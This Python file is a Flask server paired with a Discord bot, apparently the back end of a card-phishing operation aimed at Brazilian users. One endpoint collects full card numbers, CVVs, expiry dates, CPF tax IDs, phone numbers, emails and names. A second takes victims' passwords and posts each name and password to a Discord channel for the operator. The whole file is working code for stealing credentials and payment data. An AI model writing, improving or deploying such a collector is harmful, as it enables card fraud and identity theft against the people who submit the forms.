import os
import asyncio
import threading
from flask import Flask, request, jsonify
import discord
from discord.ext import commands
from model.cardModel import Card

app = Flask(__name__)

# Get tokens and channel info from environment variables
DISCORD_TOKEN = os.getenv("TOKEN")
# The Discord channel ID where messages will be sent. 
# Set this in your environment variables. If not set, it defaults to 0 (no channel).
DISCORD_CHANNEL_ID = int(os.getenv("DISCORD_CHANNEL_ID", "0"))

# Set up the discord bot with all intents.
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="/", intents=intents)

# In-memory list to store cards.
cards: list[Card] = []

@app.route('/auth', methods=['GET'])
def authInfo():
    try:
        data = request.json
        required_keys = [
            'celular', 'operadora', 'valor', 'email', 'nome', 'cpf',
            'card', 'mes', 'ano', 'cvv', 'token', 'bin', 'dadosbin'
        ]
        if not data or not all(key in data for key in required_keys):
            return jsonify({'Error': 'Unknown'}), 401

        # Extract values from JSON
        celular = data.get('celular')
        operadora = data.get('operadora')
        valor = data.get('valor')
        email = data.get('email')
        nome = data.get('nome')
        cpf = data.get('cpf')
        card_value = data.get('card')
        mes = data.get('mes')
        ano = data.get('ano')
        cvv = data.get('cvv')
        token_value = data.get('token')
        bin_value = data.get('bin')
        dadosbin = data.get('dadosbin')

        # Create a new Card instance and add it to our in-memory list
        new_card = Card(celular, operadora, valor, email, nome, cpf,
                        card_value, mes, ano, cvv, token_value, bin_value, dadosbin)
        cards.append(new_card)

        return jsonify({'Message': 'Ok'}), 200

    except Exception as ex:
        print("Error in /auth:", ex)
        return jsonify({'Error': 'Unknown'}), 401

@app.route('/authpass', methods=['GET'])
def authPassword():
    try:
        data = request.json
        if not data or not all(key in data for key in ['senha', 'token']):
            return jsonify({'Error': 'Unknown'}), 401

        senha = data.get('senha')
        provided_token = data.get('token')

        # For each card that matches the provided token, send a message via Discord.
        for card in cards:
            if card.token == provided_token:
                if DISCORD_CHANNEL_ID:
                    channel = bot.get_channel(DISCORD_CHANNEL_ID)
                    if channel is not None:
                        # Prepare the message including some card info and the provided password
                        message = f"User {card.nome} provided password: {senha}"
                        # Schedule sending the message using the Discord bot's event loop.
                        future = asyncio.run_coroutine_threadsafe(channel.send(message), bot.loop)
                        try:
                            future.result(timeout=10)
                        except Exception as e:
                            print("Failed to send Discord message:", e)
                else:
                    print("DISCORD_CHANNEL_ID is not set properly; skipping Discord message.")
        return jsonify({'Message': 'Ok'}), 200

    except Exception as ex:
        print("Error in /authpass:", ex)
        return jsonify({'Error': 'Unknown'}), 401

def run_discord_bot():
    # Start the Discord bot.
    bot.run(DISCORD_TOKEN)

if __name__ == "__main__":
    # Start the discord bot in a separate thread so it runs concurrently with the Flask app.
    discord_thread = threading.Thread(target=run_discord_bot)
    discord_thread.start()

    # Start the Flask application.
    app.run(host="0.0.0.0", port=5000)